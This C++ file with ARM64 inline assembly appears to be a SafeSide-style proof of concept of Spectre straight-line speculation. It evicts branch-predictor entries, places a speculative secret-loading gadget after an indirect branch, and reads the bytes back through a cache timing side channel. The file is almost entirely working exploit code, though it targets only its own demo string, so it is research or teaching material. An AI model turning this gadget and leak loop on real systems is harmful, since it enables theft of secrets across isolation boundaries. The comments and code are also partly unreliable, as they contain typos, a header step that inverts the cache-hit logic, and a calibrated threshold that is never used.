/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

// Spectre SLS -- Straight-Line Speculation via indirect branch on ARM64.
//
// Demonstrates that after an unconditional indirect branch (BR instruction),
// the CPU may speculatively execute instructions placed immediately after the
// branch in memory ("straight-line"), before the branch target is resolved.
//
// This is related to CVE-2020-1384. The attack works as follows:
//
//   1. FLush target of indirect branch from cache (slow window = SLS window) 
//
//   2. ibtb_flush: evict BTB entries to ensure BTB miss on the BR
//
//   3. CPU speculatively executes straight-line code after BR:
//      LDRB secret -> ADD channel offset -> LDR channel (cache side channel)
//
//   4. Measure which channel line is not hot using MeasuureReadLatency
//
// PLATFORM NOTES:
// This demo targets ARM64 (AArch64) only. 

#include "compiler_specifics.h"

#if !SAFESIDE_ARM64
#  error Unsupported architecture. ARM64 required.
#endif

#include <array>
#include <cstring>
#include <iostream>
#if SAFESIDE_LINUX
#include <sched.h>
#endif
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "asm/measurereadlatency.h"
#include "cache_sidechannel.h"
#include "instr.h"
#include "local_content.h"
#include "utils.h"

#define CHANNEL_SEGMENT 4096

__attribute__((aligned(64))) volatile uint64_t counter = 0;
long miss_min = 0;
uint8_t channel[256 * CHANNEL_SEGMENT];
uint64_t *g_target;

void *inc_counter(void *a) {
#if SAFESIDE_LINUX
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(1, &set);
    sched_setaffinity(0, sizeof(set), &set);
#endif

    uint64_t cnt = 0;
    while (1) {
        cnt += 1;
        counter = cnt;
        asm volatile("DMB OSHST");
    }
}

__attribute__((aligned(32))) int ibtb_flush() {
    asm volatile(
        " .rept 6000\n"
        "   adr x0, 3f\n  br x0\n"
        "   nop\n"
        " 1: adr x0, 4f\n  br x0\n"
        "   nop\n"
        " 2: nop\n"
        "    adr x0, 1b\n  br x0\n"
        "    nop\n"
        " 3: nop\n"
        "    adr x0, 2b\n  br x0\n"
        "    nop\n"
        " 4: nop\n"
        " .endr\n"
        :
        :
        : "x0");
    return 0;
}

uint64_t calibrate_miss_min(void) {
    uint64_t sum = 0;
    uint64_t min_val = 0xFFFFF;
    const int rounds = 250;

    for (int r = 0; r < rounds; r++) {
        FlushDataCacheLineNoBarrier(&channel[r * CHANNEL_SEGMENT]);
        MemoryAndSpeculationBarrier();
        uint64_t latency = MeasureReadLatency(&channel[r * CHANNEL_SEGMENT]);
        if (latency < min_val && r > 50)
            min_val = latency;
        sum += latency;
    } 
    printf("[CALIBRATE] Cache miss (MeasureReadLatency): Avg=%llu, min=%llu\n",
           (unsigned long long)(sum / rounds), (unsigned long long)min_val);

    uint64_t hit_sum = 0;
    for (int r = 0; r < rounds; r++) {
        ForceRead(&channel[(r % 3) * CHANNEL_SEGMENT]);
        uint64_t latency = MeasureReadLatency(&channel[(r % 3) * CHANNEL_SEGMENT]);
        hit_sum += latency;
    } 
    printf("[CALIBRATE] Cache hit (MeasureReadLatency): Avg=%llu\n",
           (unsigned long long)(hit_sum / rounds));
   
    if (min_val > 4)
        min_val -= 2;
  
    printf("[CALIBRATE] miss_min threshold=%llu\n", (unsigned long long)min_val);
    return min_val;
}
 
static void dummy_target() {}

int victim(const char *secret_addr, uint64_t godummy,
           void *channel_base) {
    asm volatile(
        " br %[go]\n"
        " ldrb w3, [%[sec]]\n"
        " add x3, %[ch], x3, lsl 12\n"
        " ldr x4, [x3]\n"
        :
        : [sec] "r"(secret_addr), [go] "r"(godummy), [ch] "r"(channel_base)
        : "x3", "x4", "memory");
    return 0;
}

static char LeakByte(size_t offset) {
    CacheSideChannel sidechannel;
    const uint64_t miss_min_local = miss_min;

    for (int run = 0; run < 200000; ++run) {
        sidechannel.FlushOracle();

        *g_target = (uint64_t)&dummy_target;
        FlushDataCacheLine(g_target);
        MemoryAndSpeculationBarrier();

        ibtb_flush();
        FlushDataCacheLine(g_target);
        MemoryAndSpeculationBarrier();

        victim(&private_data[offset], *g_target, 
               (void *)sidechannel.GetOracle().data());

        ibtb_flush();

        std::pair<bool, char> result = sidechannel.AddHitAndRecomputeScores();
        if (result.first) 
            return result.second;
    }

    std::cerr << "Does not coverage" << std::endl;
    return '?';
}

int main() {
#if SAFESIDE_LINUX
    PinToTheFirstCore();
#endif

    pthread_t inc_counter_thread;
    if (pthread_create(&inc_counter_thread, NULL, inc_counter, NULL)) {
        fprintf(stderr, "Error create thread\n");
        return -1;
    }

    while (counter < 500000000) {
        ibtb_flush();
    }

    printf("[INFO] main@%p, victim@%p, private_date@%p\n",
           (void *)&main, (void *)&victim, (void *)private_data);
    printf("[INFO] private_date = %s\n", private_data);

    g_target = (uint64_t *)malloc(sizeof(uint64_t));

    miss_min = calibrate_miss_min();
    std::cout << "Leaking the string: ";
    std::cout.flush();
    for (size_t i = 0; i < strlen(private_data); ++i) {
        std::cout << LeakByte(i);
        std::cout.flush();
    }
    std::cout << "\nDone!\n";
}
